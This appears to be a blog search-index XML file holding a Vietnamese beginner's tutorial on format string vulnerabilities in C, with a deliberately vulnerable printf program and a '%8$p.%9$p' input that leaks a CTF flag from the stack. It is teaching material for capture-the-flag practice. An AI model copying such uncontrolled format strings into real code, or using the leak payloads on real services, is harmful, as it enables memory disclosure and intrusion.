<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Lỗ hổng Format String part 1</title>
      <link href="/2023/12/05/Lo-hong-format-string-part-1/"/>
      <url>/2023/12/05/Lo-hong-format-string-part-1/</url>
      
        <content type="html"><![CDATA[<p>#Bản demo</p><h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p>Qua quá trình đọc một số bài viết Tiếng Việt về lỗ hổng này, mình thấy cảm thấy thiếu cho người muốn mày mò hiểu bản chất, chưa tổng hợp, hoặc các blog khác chỉ nói về cách khai thác(theo góc độ của mình). Qua chuỗi blog này, mình hi vọng sẽ cung cấp cho bạn đầy đủ về kỹ thuật Format string, <strong>dành cho người mới tìm hiểu</strong>.</p><p>Nội dung của các phần dự kiến như sau:</p><ul><li>Part1: Các kiến thức lý thuyết cơ bản của ngôn ngữ C và lỗi Format String. </li><li>Part2: Mô tả cách lợi dụng lỗ hổng Format String để leak dữ liệu trong bộ nhớ. [Dự kiến 2025]</li><li>Part3: Mô tả cách lợi dụng lỗ hổng Format String để ghi đè giá trị tùy ý. [Dự kiến 2038]</li></ul><p><em>Lưu ý</em>: Trong chuỗi blog này, mình sẽ demo trên lập trình C&#x2F;C++, hệ điều hành Unix [Ubuntu 20.04]. Có thể một vài nội dung truyền tải sai&#x2F;chưa đúng. Xin nhận góp ý thông qua Github.<br>Các bạn cần biết qua về lỗ hổng BOF trước khi đến với lỗ hổng FormatString.</p><blockquote><p><em>Hello, mình là Bai Zhong De!</em></p></blockquote><p><strong>Sample</strong></p><p>Với các bạn mới chơi CTF đôi khi sẽ có các bài dạng lĩnh vực Pwable&#x2F;Exploit&#x2F;Binary liên quan đến lỗi Format string và các bạn thấy người ta chỉ <code>AAAAAAAA%x%x%x%x%x%x</code> hoặc <code>%37$s</code> chẳng hạn thì sẽ lấy được nội dung <code>flag</code> mặc dù file thực thi không có câu lệnh in ra nội dung file flag.txt.</p><p>Dưới đây là một ví dụ: Dịch vụ chạy ELF <code>pandafmt</code> trên server được cung cấp cho người chơi, yêu cầu đọc nội dung file flag ở trên server đó.</p><p>Lập trình <em>fmt.c:</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//*Hãy tự đọc hiểu chương trình trước khi tiếp tục.*</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ignore</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ignore</span><span class="params">()</span> &#123;</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> flag[<span class="number">27</span>];</span><br><span class="line"><span class="type">char</span> yourname[<span class="number">128</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line">fp = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(fp == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;No file flag.txt&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fgets(flag,<span class="number">27</span>,fp);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your name: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%128s&quot;</span>,yourname);</span><br><span class="line"><span class="built_in">printf</span>(yourname);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ignore();</span><br><span class="line">vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>Biên dịch chương trình C:</em></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o pandafmt fmt.c</span><br></pre></td></tr></table></figure><p><em>Nội dung file flag.txt:</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cutepanda&#123;flag&#125;</span><br></pre></td></tr></table></figure><p><em>Khai thác thông qua lỗ hổng Format string(cứ biết thế đã nhé :&lt;):</em></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./pandafmt</span><br><span class="line">Input your name: </span><br><span class="line">%8<span class="variable">$p</span>.%9<span class="variable">$p</span></span><br><span class="line">0x646e617065747563.0xa7d67616c667b61</span><br></pre></td></tr></table></figure><p>Chúng ta có thể thấy giá trị <code>0x64 6e 61 70 65 74 75 63</code> và <code>0x0a 7d 67 61 6c 66 7b 61</code> khi chuyển từ hexa sang giá trị ASCII là <code>cutepanda&#123;flag&#125;</code>. Đây chính là <code>flag</code> mà chúng ta cần tìm. Có thể sử dụng các công cụ online để chuyển đổi <a href="https://kt.gy/tools.html#conv/">kt.gy</a> hoặc công cụ mạnh hơn <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a>.</p><h1 id="1-Cac-kien-thuc-can-biet"><a href="#1-Cac-kien-thuc-can-biet" class="headerlink" title="1. Các kiến thức cần biết"></a>1. Các kiến thức cần biết</h1><p>Như mình nói ban đầu, có thể mọi người đã làm được những bước như này nhưng mong muốn hiểu được bản chất, thì mình sẽ ở đây trao đổi với mọi người. Vì đây là blog đầu tiên liên quan đến một số kiến thức khai thác lỗ hổng <strong>cơ bản</strong>, nhưng không bắt đầu từ lỗi Buffer Overflow, nên mình sẽ tổng hợp các kiến thức khác đi kèm, mọi người nên đọc qua. Ý kiến riêng thì các bạn cần biết lỗ hổng BOF(Buffer Over Flow) trước khi qua lỗ hổng Format String.</p><p>Let’s go… </p><h2 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h2><h3 id="32bit-vs-64bit"><a href="#32bit-vs-64bit" class="headerlink" title="32bit vs 64bit"></a>32bit vs 64bit</h3><p>Hiện tại trong các kiến trúc có 32bit(x86) và 64bit(x64). Muốn hiểu rõ hơn các thành phần, các bạn có thể tìm hiểu <a href="https://www.tutorialspoint.com/computer_fundamentals/computer_components.htm">tại đây</a>.<br>Đại loại, với mỗi hệ thống, thì bộ xử lý, bộ nhớ, các thành phần khác sẽ xử lý tương ứng trên các đơn vị 32bit hay 64bit.</p><h3 id="Memory-Layout"><a href="#Memory-Layout" class="headerlink" title="Memory Layout"></a>Memory Layout</h3><p>Chúng ta đều biết, máy tính chỉ hoạt động qua ngôn ngữ máy, các bit <code>0</code> <code>1</code>, vì vậy để máy tính hiểu được chương trình, cần có quá trình biên dịch (<code>compiler</code>) quá trình này sẽ chuyển từ ngôn ngữ bậc cao(dễ viết, dễ đọc, dễ hiểu) sang ngôn ngữ bậc thấp hơn(ngôn ngữ máy). Vậy thì chương trình C của chúng ta cũng có trình biên dịch như thế(file .c&#x2F;.cpp -&gt; .. -&gt; Assembly -&gt; .. -&gt; 0110), cho nên nó cần có các vùng nhớ( hay còn gọi là memory), chủ yếu là vùng nhớ của RAM, để thực hiện lưu trữ dữ liệu chương trình. Qua đó, Bộ phận xử lý Trung tâm (Central Processing Unit&#x2F;CPU) của máy tính sẽ lấy các dữ liệu này để tính toán và xử lý. </p><blockquote><p>CPU là mạch điện tử thực hiện các câu lệnh của chương trình máy tính bằng cách thực hiện các phép tính số học, logic, so sánh và các hoạt động nhập&#x2F;xuất dữ liệu (Input&#x2F;Output) cơ bản từ mã lệnh được định sẵn trong một máy tính.</p></blockquote><p>Ngôn ngữ lập trình C hoạt động bằng cách ghi đoạn mã của bạn vào một tệp thực thi(VD: PE file trên Windows, ELF file trên hệ thống Unix như Ubuntu, Kali,…). Trình biên dịch C sẽ lấy tệp thực thi đó và chuyển đổi toàn bộ thành mã máy, sau đó sẽ được máy tính của bạn thực thi khi chạy chương trình.</p><p>Thông thường, khi chương trình biên dịch được chạy(PE, ELF) thì dữ liệu của chương trình đó sẽ được lưu trong thanh RAM của máy tính.</p><blockquote><p>RAM (viết tắt của Random Access Memory) là một loại bộ nhớ khả biến cho phép truy xuất đọc-ghi ngẫu nhiên đến bất kỳ vị trí nào trong bộ nhớ dựa theo địa chỉ bộ nhớ. Thông tin lưu trên RAM chỉ là tạm thời, chúng sẽ mất đi khi mất nguồn điện cung cấp.<br>Bộ nhớ của chương trình C khi được chạy(lưu trong RAM) bao gồm các phần sau:</p></blockquote><table><thead><tr><th align="center">Segment</th><th align="center">Ý nghĩa</th></tr></thead><tbody><tr><td align="center">Text segment</td><td align="center">.text chứa các đoạn mã lệnh chương trình</td></tr><tr><td align="center">Initialized data segment</td><td align="center">.data Chứa các biến global, static nếu các biến này được khởi tạo khác 0</td></tr><tr><td align="center">Uninitialized data segment</td><td align="center">.bss Chứa các biến global, static nếu không khai báo giá trị&#x2F;hoặc gán giá trị bằng 0</td></tr><tr><td align="center">Heap (Dynamic Memory Allocation)</td><td align="center">Cấp phát, giải phóng bộ nhớ qua các hàm như malloc, calloc, free, delete, new,…</td></tr><tr><td align="center">Stack (Automatic Variable Storage)</td><td align="center">Vùng nhớ cấp phát tự động LIFO(Last In First Out)</td></tr></tbody></table><p>Qúa trình phát triển bộ nhớ(gọi thêm hàm, khai báo,…) sẽ có chiều hướng phát triển trong memory như sau.</p><p>Highaddress <img src="/../images/Lo-hong-format-string-part-1/Program_memory_layout.pdf.jpg"> Lowaddress</p><p>Trong các vùng nhớ, chúng ta có <code>địa chỉ</code> và <code>giá trị</code> tại địa chỉ đó.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">197</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a); <span class="comment">// = 0x658741 địa chỉ</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a); <span class="comment">// = 197 giá trị</span></span><br></pre></td></tr></table></figure><p>Trong thanh RAM, có vùng nhớ Stack và Heap, mỗi khi một hàm trong chương trình chạy sẽ được cấp phát một vùng trên Stack. Và Stack sẽ hoạt động cách cấp phát từ địa chỉ cao hơn (HighAddress) -&gt; sang địa chỉ thấp hơn (LowAddress). Ví dụ, hàm thứ <code>1</code> chương trình chạy trước và chưa dừng lại thì chương trình <code>1</code> sẽ được cấp vùng nhớ stack tại địa chỉ 0x10101010, nếu hàm thứ <code>2</code> chạy sau sẽ được cấp phát tại địa chỉ 0x10100000 chẳng hạn.<br>Và Heap sẽ ngược lại từ LowAddress -&gt; HighAddress.</p><h3 id="Function-call"><a href="#Function-call" class="headerlink" title="Function call"></a>Function call</h3><p>Quá trình chương trình thực hiện, sẽ gọi các hàm liên tục (thông qua <code>call</code> trong Assembly), sau đó lại quay trở về tại thời điểm trước khi gọi hàm đó( thông qua <code>ret</code>).</p><p>Cùng nhìn lại <em>fmt.c</em>: Tại <code>main</code> chương trình gọi 2 hàm là <code>ignore</code> và <code>vuln</code> (cái này ai từng thực hiện về lỗ hổng Buffer Overflow sẽ hiểu rõ). Khi chương trình chạy hàm <code>main</code>, stack sẽ cấp phát một vùng nhớ cho chương trình, khi hàm <code>main</code> chưa kết thúc thì vùng nhớ đã được cấp phát sẽ được giữ nguyên.<br>Khi hàm <code>main</code> gọi hàm <code>ignore()</code> thì chương trình sẽ sử dụng lệnh <code>call ignore</code>(giai đoạn này sẽ phải cấp phát một vùng nhớ để lưu các biến, EBP, return address,.. và vùng nhớ này sẽ có địa chỉa thấp hơn vùng địa chỉ <code>main</code> đã được stack cấp phát trước đó) và thực hiện hàm <code>ignore</code> cho xong mới quay lại tiếp thực hiện hàm <code>main</code>. Sau khi chạy xong hàm <code>ignore</code> thì chương trình phải về hàm <code>main</code> để thực hiện tiếp hàm <code>vuln</code>, giai đoạn trở về thông qua địa chỉ trả về <code>return address</code>.</p><p>Trong chương trình sẽ có nhiều hàm khác nhau, mỗi phân vùng trên stack được cấp cho một hàm, khi hàm chưa kết thúc, và hàm giữ liên tục phân vùng này trên stack thì gọi là <code>StackFrame</code>.</p><p>Vậy mỗi <code>StackFrame</code> có chứa những cái gì?<br><strong><em>x86</em></strong><br>Trong hệ điều hành 32bit, <code>StackFrame</code> khi một hàm trong chương trình được gọi (vùng nhớ mà stack cấp phát cho hàm) sẽ như sau:</p><p>Ví dụ chương trình có hàm sau:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">5</span>;</span><br><span class="line">vuln(<span class="type">int</span> a, <span class="type">char</span> *b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>khi hàm <code>vuln</code> chưa kết thúc thì thì <code>StackFrame</code> của hai hàm <code>main</code> và <code>vuln</code> sẽ như thế này:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[Highaddress]</span><br><span class="line">    [........]</span><br><span class="line">    [ebp + 16] (3rd function argument)</span><br><span class="line">    [ebp + 12] (2nd argument)</span><br><span class="line">    [ebp +  8] (1st argument)</span><br><span class="line">main[ebp +  4] (return address)</span><br><span class="line">    [ebp     ] (old ebp value)  </span><br><span class="line">    [ebp -  4] (1st local variable) //x = 5</span><br><span class="line">    [ebp -  8] (2st local variable)</span><br><span class="line">    [........]</span><br><span class="line">    [........]</span><br><span class="line">    [........]</span><br><span class="line">    [........]</span><br><span class="line">    [ebp + 16] (3rd function argument)</span><br><span class="line">    [ebp + 12] (2nd argument)  //b</span><br><span class="line">    [ebp +  8] (1st argument) //a</span><br><span class="line">vuln[ebp +  4] (return address)</span><br><span class="line">    [ebp     ] (old ebp value) &lt;- ESP new</span><br><span class="line">    [ebp -  4] (1st local variable)</span><br><span class="line">    [ebp -  8] (2st local variable)</span><br><span class="line">    [........]</span><br><span class="line">    [Lowaddress]</span><br></pre></td></tr></table></figure><p><em>Oops:</em></p><p><em>- Argument là đối số khi được gọi hàm, Parameter là tham số của hàm khi định nghĩa hàm</em></p><p><em>- Trong hệ điều hành 32bit thì các tham số của hàm được cấp phát nằm năm phía trên EBP</em></p><p>Khung phía trên là stack của chúng ta, hàm <code>main</code> vẫn chưa kết thúc nên vẫn giữ được <code>StackFrame</code> của hàm <code>main</code>, sau đó hàm <code>main</code> gọi hàm <code>vuln</code> cho nên stack cần cấp phát thêm một vùng nhớ để chạy hàm <code>vuln</code>, vùng nhớ này nằm phía dưới ngẫu nhiên không quá xa so với hàm <code>main</code>.</p><p><strong><em>x64</em></strong><br>Hơi khác với 32bit, kiến trúc 64bit 6 con con trỏ tham số sẽ được lưu trữ lần lượt trong các thanh ghi <em>RDI, RSI, RDX, RCX, R8 và R9</em>, nếu có thêm các tham số thì sẽ được lưu trên stack.</p><p>[Highaddress]<br>[…]<br>[rbp + 16] (maybe 9th function argument)<br>[rbp + 12] (maybe 8th argument)<br>[rbp + 8]  (maybe 7th argument)<br>[rbp + 4]  (return address)<br>[rbp]      (old ebp value)<br>[rbp - 4]  (1st local variable)<br>[rbp - 8]  (2st local variable)<br>[….]<br>[Lowaddress]</p><h2 id="FormatString-Vulnerablility"><a href="#FormatString-Vulnerablility" class="headerlink" title="FormatString Vulnerablility"></a>FormatString Vulnerablility</h2><h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>Lỗi format string là một lỗi nguy hiểm không thua gì lỗi tràn bộ đệm. Khi một chương trình có lỗi này, hacker có thể leak dữ liệu, làm crash chương trình, và thậm chí là khai thác chạy các chương trình độc hại.<br>Format string là chuỗi string để định dạng dữ liệu in ra trong các hàm <strong>printf, fprintf, sprintf, snprintf, vsprintf, vsnprintf vfprintf, vprintf,…</strong> sẽ sử dụng tham số thứ nhất là chuỗi định đạng.<br>Cấu trúc được thiết của các hàm in ra trong lập trình C.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">fprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">dprintf</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">sprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">vprintf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, va_list ap)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">vfprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, va_list ap)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">vdprintf</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> *format, va_list ap)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">vsprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, va_list ap)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">vsnprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, va_list ap)</span>;</span><br></pre></td></tr></table></figure><p>Trong chuỗi blog này, chúng ta sẽ mô phỏng hoạt động của một hàm <code>printf</code> bình thường</p><p><em>Trước khi tiếp tục: stdin, stdout, stder là các con trỏ tiêu chuẩn cho việc input, output, và error output. Mặc địch, chuẩn input sẽ đọc dữ liệu từ bàn phím, chuẩn output và error output sẽ in ra màn hình</em> </p><p><code>int printf ( const char * format, ... );</code> ý nghĩa hàm <code>printf</code> là sẽ ghi chuỗi được trỏ bởi <code>const char *format*</code> vào thanh ghi vào luồng <code>stdout</code> -&gt; có nghĩa là nó sẽ in ra màn hình chuỗi được trỏ bở con trỏ <code>format</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello cutepanda&quot;</span>); <span class="comment">//in ra màn hình &quot;Hello cutepanda&quot; &lt;=&gt;  *format = chuỗi &quot;Hello cutepanda&quot;</span></span><br></pre></td></tr></table></figure><p>Đặc biệt, nếu muốn bổ sung thêm các đối số thì chúng ta không thể viết kiểu:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//a.c</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>,<span class="string">&quot;cutepanda&quot;</span>);</span><br></pre></td></tr></table></figure><p>thì sẽ có lỗi sau</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gcc</span> a.c</span><br><span class="line">a.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">a.c:4:16: warning: too many arguments <span class="keyword">for</span> format [-Wformat-extra-args]</span><br><span class="line">    4 |         <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>, <span class="string">&quot;cutepanda&quot;</span>);</span><br></pre></td></tr></table></figure><p>Với nhu cầu như thế, trong lập trình C&#x2F;C++ có thể thay thế một số nội dung trong trong <em>format</em> bằng cách thêm một số <strong>format specifiers</strong>(định dạng được chỉ định, chỉ định ở đây có thể hiểu là cách hiển thị ra màn hình dạng số, chữ, hexa,…), các <em>format sepectifiers</em> này được bắt đầu bằng ký tự <code>%</code> và bổ sung đối số tiếp theo trong hàm <code>printf</code>. </p><p>Một số <strong>format specifiers</strong>:</p><table><thead><tr><th align="left">specifies</th><th align="left">Output</th></tr></thead><tbody><tr><td align="left">%d hoặc %i</td><td align="left">Số thập phân có dấu(dấu - đó &#x3D; )))</td></tr><tr><td align="left">%u</td><td align="left">Số thập phân không dấu</td></tr><tr><td align="left">%x</td><td align="left">Số dạng hexa</td></tr><tr><td align="left">%s</td><td align="left">Chuỗi ký tự</td></tr><tr><td align="left">%p</td><td align="left">Dạng một địa chỉ con trỏ (Có thêm 0x)</td></tr><tr><td align="left">%n</td><td align="left">Trường hợp đặc biệt, không in ra màn hình, đối số tương ứng với nó là một số không dấu, số ký tự được ghi vào stdout(&lt;&#x3D;&gt;in ra màn hình) sẽ được lưu vào vị trí chỉ định(đối số của nó)</td></tr><tr><td align="left">%%</td><td align="left">Nếu có % cạnh phía sau % khác thì sẽ in ra 1 ký tự %</td></tr><tr><td align="left">Và nhiều cái khác nữa</td><td align="left">Hiccc</td></tr></tbody></table><p>Và có nhiều <code>flags</code> của hàm <code>printf</code> để định dạng cách in.<br>Ví dụ cụ thể: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello %s&quot;</span>, <span class="string">&quot;cutepanda&quot;</span>)</span><br></pre></td></tr></table></figure><p>ở ví dụ này, <code>format</code> là <code>Hello %s</code>, <code>format specifiers</code> là <code>%s</code>, do có thêm một <code>format specifiers</code> nên ta phải thêm một đối số, đó là chuỗi <code>cutepanda</code>. Ở đây, có nghĩa là chương trình sẽ in ra chuỗi <code>Hello cutepanda</code>. </p><p>Đấy là cách hoạt động của hàm <code>printf</code> trong lập trình C.</p><p>Vậy, <strong>lỗi format string xảy ra khi nào?</strong><br>Đó là khi một hàm in trong chuỗi <em>format</em> có chứa các <em>format specifiers</em> nhưng không đủ đối số tương ứng cho <em>format specifiers</em> . Đại loại lập trình không đúng với thiết kế của ngôn ngữ C.<br>Ví dụ, khi lập trình với hàm <code>printf</code> đây là lỗi:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Hello %s %s&quot;,&quot;cutepanda&quot;); //Lỗi. 2 %s nhưng chỉ có một đối số.</span><br><span class="line">printf(&quot;Hello %x&quot;); //Lỗi. 1 %x nhưng lại không có đối số.</span><br><span class="line">printf(&quot;%x&quot;); //Lỗi. %x nhưng lại không có đối số.</span><br><span class="line">printf(&quot;%%x&quot;); //Không lỗi. Chương trình in ra &quot;%x&quot;.</span><br></pre></td></tr></table></figure><p>Cuối cùng, làm sao có thể tận dụng lỗi format string để khai thác được lỗ hổng, đó là khi nếu bạn có thể kiểm soát được chuỗi <code>format</code> của hàm <code>printf</code> thì bạn có thể tận dụng các lỗ hổng này để hack hệ thống.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *name == vị trí có thể kiểm soát(nhập tên từ bàn phím, nhập tên từ file,...);</span><br><span class="line"><span class="built_in">printf</span>(name); =&gt; Đây là nơi mà chúng ta sẽ tận dụng khai thác lỗi.</span><br></pre></td></tr></table></figure><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>Khai thác lỗ hổng Format string có hai phần quà bạn có thể tận dụng, cần xuyên suốt trong quá trình tìm hiểu này.</p><ul><li><strong>Leak dữ liệu trên stack.</strong></li><li><strong>Ghi đè vào một địa chỉ tùy ý, nếu vùng nhớ này chúng ta có quyền ghi (rwx read-write-excute).</strong></li></ul><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Leakable-data"><a href="#Leakable-data" class="headerlink" title="Leakable data"></a>Leakable data</h3><p>Như ví dụ đầu blog, khi chạy chương trình, <code>./pandafmt</code>, về đúng nguyên tắc của lập trình, chúng ta không thể đọc được nội dung của <code>flag.txt</code>. Tuy nhiên, chúng ta đã đọc được nội dung của <code>flag.txt</code> thông qua lỗ hổng FormatString. Vậy, nguyên lý nào khiến chúng ta có thể làm điều đó?  Part2 mình sẽ giải thích.<br>Rất vui khi được các bạn chia sẻ cho những bạn khác, từ nguồn này.</p><blockquote><p>Bye, mình là Cute Panda &lt;3</p></blockquote><p><strong>End part1.</strong></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.tutorialspoint.com/computer_fundamentals/computer_components.htm">Computer Components</a></li><li><a href="https://www.geeksforgeeks.org/memory-layout-of-c-program/">Memory layout of C Programe</a></li><li><a href="https://en.wikipedia.org/wiki/File:Program_memory_layout.pdf">Programe Memory PDF</a></li><li><a href="https://ctf-wiki.org/">CTF Wiki</a></li><li><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html">C language function call stack (1)</a></li><li><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html">C language function call stack (2)</a></li><li><a href="https://www.bluemoon.com.vn/books/taose.pdf">Nghệ thuật tận dụng lỗi phần mềm</a></li><li><a href="https://ctf101.org/binary-exploitation/what-is-the-stack/">The Stack</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FormatString </tag>
            
            <tag> Pwnable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phishing tấn công người dùng Windows</title>
      <link href="/2023/11/22/Phishing-tancongnguoidungwindows/"/>
      <url>/2023/11/22/Phishing-tancongnguoidungwindows/</url>
      
